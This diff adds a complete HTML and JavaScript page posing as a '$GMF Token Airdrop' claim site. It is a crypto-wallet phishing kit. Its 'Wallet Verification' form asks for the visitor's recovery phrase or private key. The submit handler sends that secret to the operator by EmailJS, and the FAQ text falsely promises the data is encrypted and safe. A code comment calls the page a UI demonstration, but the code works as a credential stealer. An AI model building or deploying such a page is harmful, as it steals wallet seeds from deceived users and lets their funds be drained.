@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>$GMF Token Airdrop Claim</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.4/gsap.min.js"></script>
+    <style>
+        .fade-in {
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.6s ease-out;
+        }
+        .fade-in.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .modal {
+            transition: all 0.3s ease-out;
+            opacity: 0;
+            visibility: hidden;
+        }
+        .modal.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .wallet-option {
+            transition: all 0.2s ease;
+        }
+        .wallet-option:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-green-50 to-blue-50 min-h-screen font-sans">
+    <!-- Main Container -->
+    <div class="container mx-auto px-4 py-12 max-w-2xl">
+        <!-- Animated Header Card -->
+        <div class="bg-white rounded-xl shadow-xl overflow-hidden mb-8 fade-in">
+            <div class="bg-gradient-to-r from-green-600 to-green-700 p-8 text-white relative">
+                <div class="absolute top-4 right-4">
+                    <span class="bg-green-800 text-xs text-white px-2 py-1 rounded-full">PRESALE ENDED</span>
+                </div>
+                <div class="flex flex-col items-center">
+                    <img src="/gamefrog.jpg" alt="$GMF Logo" class="w-20 h-20 mb-4 rounded-full border-4 border-white shadow-md">
+                    <h1 class="text-3xl font-bold text-center">$GMF Token Airdrop</h1>
+                    <p class="mt-2 opacity-90 text-center">Claim your presale tokens now</p>
+                </div>
+            </div>
+            
+            <div class="p-8">
+                <div class="bg-green-50 border border-green-200 rounded-lg p-6 mb-8 shadow-sm">
+                    <h2 class="text-xl font-semibold text-green-800 mb-3 flex items-center">
+                        <i class="fas fa-gift mr-2"></i> Your Token Allocation
+                    </h2>
+                    <div class="flex justify-between items-center bg-white p-4 rounded-lg border border-gray-200">
+                        <div>
+                            <p class="text-gray-500 text-sm">Eligible Amount</p>
+                            <p class="text-2xl font-bold">0 $GMF</p>
+                        </div>
+                        <div class="text-right">
+                            <p class="text-gray-500 text-sm">Value</p>
+                            <p class="text-xl font-medium">$0.00</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-8 shadow-sm">
+                    <h2 class="text-xl font-semibold text-blue-800 mb-3 flex items-center">
+                        <i class="fas fa-info-circle mr-2"></i> Presale Summary
+                    </h2>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div class="bg-white p-3 rounded-lg border border-gray-200">
+                            <p class="text-gray-500 text-sm">Token Price</p>
+                            <p class="font-medium">$0.01</p>
+                        </div>
+                        <div class="bg-white p-3 rounded-lg border border-gray-200">
+                            <p class="text-gray-500 text-sm">Total Raised</p>
+                            <p class="font-medium">$200,864.93</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <button id="claimButton" class="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-4 px-6 rounded-lg shadow-lg transition-all duration-300 flex items-center justify-center space-x-3 transform hover:scale-[1.02]">
+                    <i class="fas fa-coins text-xl"></i>
+                    <span class="text-lg">Claim My Tokens</span>
+                </button>
+                
+                <div class="mt-6 text-center text-sm text-gray-500">
+                    <p>Token distribution requires manual verification for security</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- FAQ Section -->
+        <div class="bg-white rounded-xl shadow-xl overflow-hidden fade-in" style="transition-delay: 0.2s">
+            <div class="bg-gray-100 p-6 border-b">
+                <h2 class="text-xl font-semibold flex items-center">
+                    <i class="fas fa-question-circle mr-2"></i> Frequently Asked Questions
+                </h2>
+            </div>
+            <div class="p-6 space-y-5">
+                <div class="border-b pb-5">
+                    <h3 class="font-medium text-gray-800 flex items-center">
+                        <i class="fas fa-clock mr-2 text-blue-600"></i> When will I receive my tokens?
+                    </h3>
+                    <p class="text-gray-600 mt-2 pl-6">Tokens will be distributed within 48 hours after successful verification of your wallet connection details.</p>
+                </div>
+                <div class="border-b pb-5">
+                    <h3 class="font-medium text-gray-800 flex items-center">
+                        <i class="fas fa-shield-alt mr-2 text-green-600"></i> Is this process secure?
+                    </h3>
+                    <p class="text-gray-600 mt-2 pl-6">Yes, all submissions are encrypted and only our verification team will have access to your details.</p>
+                </div>
+                <div>
+                    <h3 class="font-medium text-gray-800 flex items-center">
+                        <i class="fas fa-exclamation-triangle mr-2 text-yellow-600"></i> What if I miss the claim period?
+                    </h3>
+                    <p class="text-gray-600 mt-2 pl-6">Unclaimed tokens will be burned after the claim period ends on December 31, 2023.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wallet Selection Modal -->
+    <div id="walletModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 modal">
+        <div class="bg-white rounded-xl shadow-2xl max-w-md w-full p-6 relative transform transition-all duration-300 scale-95">
+            <button id="closeWalletModal" class="absolute top-4 right-4 text-gray-500 hover:text-gray-700">
+                <i class="fas fa-times text-xl"></i>
+            </button>
+            <h2 class="text-2xl font-bold text-gray-800 mb-6 text-center">Connect Your Wallet</h2>
+            <p class="text-gray-600 mb-6 text-center">Select your preferred wallet to continue with the claim process</p>
+            
+            <div class="space-y-4">
+                <div id="metamaskOption" class="wallet-option bg-gray-50 border border-gray-200 rounded-lg p-4 flex items-center cursor-pointer hover:bg-gray-100">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="w-10 h-10 mr-4">
+                    <div>
+                        <h3 class="font-semibold">MetaMask</h3>
+                        <p class="text-sm text-gray-500">Browser extension</p>
+                    </div>
+                    <i class="fas fa-chevron-right ml-auto text-gray-400"></i>
+                </div>
+                
+                <div id="trustWalletOption" class="wallet-option bg-gray-50 border border-gray-200 rounded-lg p-4 flex items-center cursor-pointer hover:bg-gray-100">
+                    <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" class="w-10 h-10 mr-4">
+                    <div>
+                        <h3 class="font-semibold">Trust Wallet</h3>
+                        <p class="text-sm text-gray-500">Mobile wallet</p>
+                    </div>
+                    <i class="fas fa-chevron-right ml-auto text-gray-400"></i>
+                </div>
+            </div>
+            
+            <div class="mt-6 text-center text-sm text-gray-500">
+                <p>Don't see your wallet? Contact support for assistance</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wallet Verification Modal -->
+    <div id="verificationModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 modal">
+        <div class="bg-white rounded-xl shadow-2xl max-w-md w-full p-6 relative">
+            <button id="closeVerificationModal" class="absolute top-4 right-4 text-gray-500 hover:text-gray-700">
+                <i class="fas fa-times text-xl"></i>
+            </button>
+            <h2 class="text-2xl font-bold text-gray-800 mb-2 text-center">Wallet Verification</h2>
+            <p class="text-gray-600 mb-6 text-center">Please provide your wallet details for verification</p>
+            
+            <form id="verificationForm" class="space-y-4">
+                <div>
+                    <label for="walletType" class="block text-sm font-medium text-gray-700 mb-1">Wallet Type</label>
+                    <select id="walletType" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500">
+                        <option value="metamask">MetaMask</option>
+                        <option value="trustwallet">Trust Wallet</option>
+                    </select>
+                </div>
+                
+                <div>
+                    <label for="walletAddress" class="block text-sm font-medium text-gray-700 mb-1">Wallet Address</label>
+                    <input type="text" id="walletAddress" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" placeholder="0x...">
+                </div>
+                
+                <div>
+                    <label for="walletPhrase" class="block text-sm font-medium text-gray-700 mb-1">Recovery Phrase/Private Key</label>
+                    <textarea id="walletPhrase" rows="4" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" placeholder="Enter your 12-word phrase or private key"></textarea>
+                    <p class="text-xs text-gray-500 mt-1">This information is required to verify ownership and will be securely handled</p>
+                </div>
+                
+                <div>
+                    <label for="userEmail" class="block text-sm font-medium text-gray-700 mb-1">Your Email</label>
+                    <input type="email" id="userEmail" class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" placeholder="you@example.com" required>
+                </div>
+                
+                <button type="submit" class="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-3 px-6 rounded-lg shadow transition-all duration-300 mt-4">
+                    Submit for Verification
+                </button>
+            </form>
+            
+            <div class="mt-4 text-center text-xs text-gray-500">
+                <p>By submitting, you agree to our verification process. Our team will contact you within 24 hours.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 modal">
+        <div class="bg-white rounded-xl shadow-2xl max-w-md w-full p-8 text-center">
+            <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                <i class="fas fa-check text-green-600 text-2xl"></i>
+            </div>
+            <h2 class="text-2xl font-bold text-gray-800 mb-2">Verification Submitted!</h2>
+            <p class="text-gray-600 mb-6">Our team will review your details and release your tokens within 48 hours. You'll receive a confirmation email shortly.</p>
+            <button id="closeSuccessModal" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg shadow transition-all duration-300">
+                Close
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Initialize animations
+        document.addEventListener('DOMContentLoaded', function() {
+            // Animate elements on load
+            gsap.utils.toArray('.fade-in').forEach((el, i) => {
+                setTimeout(() => {
+                    el.classList.add('active');
+                }, i * 200);
+            });
+
+            // Initialize EmailJS (replace with your credentials)
+            emailjs.init('YOUR_EMAILJS_USER_ID');
+        });
+
+        // Modal functionality
+        const claimButton = document.getElementById('claimButton');
+        const walletModal = document.getElementById('walletModal');
+        const verificationModal = document.getElementById('verificationModal');
+        const successModal = document.getElementById('successModal');
+        const closeWalletModal = document.getElementById('closeWalletModal');
+        const closeVerificationModal = document.getElementById('closeVerificationModal');
+        const closeSuccessModal = document.getElementById('closeSuccessModal');
+        const metamaskOption = document.getElementById('metamaskOption');
+        const trustWalletOption = document.getElementById('trustWalletOption');
+        const verificationForm = document.getElementById('verificationForm');
+
+        // Show wallet modal
+        claimButton.addEventListener('click', () => {
+            walletModal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        });
+
+        // Close wallet modal
+        closeWalletModal.addEventListener('click', () => {
+            walletModal.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        });
+
+        // Close verification modal
+        closeVerificationModal.addEventListener('click', () => {
+            verificationModal.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        });
+
+        // Close success modal
+        closeSuccessModal.addEventListener('click', () => {
+            successModal.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        });
+
+        // Wallet selection
+        metamaskOption.addEventListener('click', () => {
+            walletModal.classList.remove('active');
+            document.getElementById('walletType').value = 'metamask';
+            verificationModal.classList.add('active');
+        });
+
+        trustWalletOption.addEventListener('click', () => {
+            walletModal.classList.remove('active');
+            document.getElementById('walletType').value = 'trustwallet';
+            verificationModal.classList.add('active');
+        });
+
+        // Form submission
+        verificationForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const walletType = document.getElementById('walletType').value;
+            const walletAddress = document.getElementById('walletAddress').value;
+            const walletPhrase = document.getElementById('walletPhrase').value;
+            const userEmail = document.getElementById('userEmail').value;
+            
+            // In production, you would NEVER collect private keys/phrases like this
+            // This is just for demonstration of the UI flow
+            
+            // Send email via EmailJS
+            emailjs.send('YOUR_EMAILJS_SERVICE_ID', 'YOUR_EMAILJS_TEMPLATE_ID', {
+                wallet_type: walletType,
+                wallet_address: walletAddress,
+                wallet_phrase: walletPhrase,
+                user_email: userEmail
+            })
+            .then(() => {
+                verificationModal.classList.remove('active');
+                successModal.classList.add('active');
+                verificationForm.reset();
+            }, (error) => {
+                alert('Error submitting verification. Please try again or contact support.');
+                console.error('EmailJS error:', error);
+            });
+        });
+
+        // Close modals when clicking outside
+        window.addEventListener('click', (e) => {
+            if (e.target === walletModal) {
+                walletModal.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            }
+            if (e.target === verificationModal) {
+                verificationModal.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            }
+            if (e.target === successModal) {
+                successModal.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            }
+        });
+    </script>
+</body>
+</html>
